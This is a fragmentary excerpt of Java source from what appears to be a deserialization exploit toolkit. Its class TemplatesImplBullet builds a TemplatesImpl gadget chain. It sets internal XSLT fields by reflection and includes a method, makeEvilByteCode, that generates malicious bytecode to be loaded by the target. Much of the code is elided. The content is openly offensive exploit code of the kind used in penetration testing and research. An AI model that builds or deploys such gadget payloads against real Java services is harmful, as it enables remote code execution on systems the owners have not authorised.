...
public class TemplatesImplBullet extends AbstractBullet<Object> {
    ...
    @Require(name = "classname", type = "String", detail = "classname of the generated byte code, default null")
    ...
    public Object getObject() throws Exception {
        ...
        //TODO modified
        ReflectionHelper.setFieldValue(templates, "_useServicesMechanism", false);
        ReflectionHelper.setFieldValue(templates, "_accessExternalStylesheet", "all");
        ReflectionHelper.setFieldValue(templates, "_auxClasses", null);
    ...
    private byte[] makeEvilByteCode(String body) throws Exception {
        ...
        bullet.set("classname", classname);
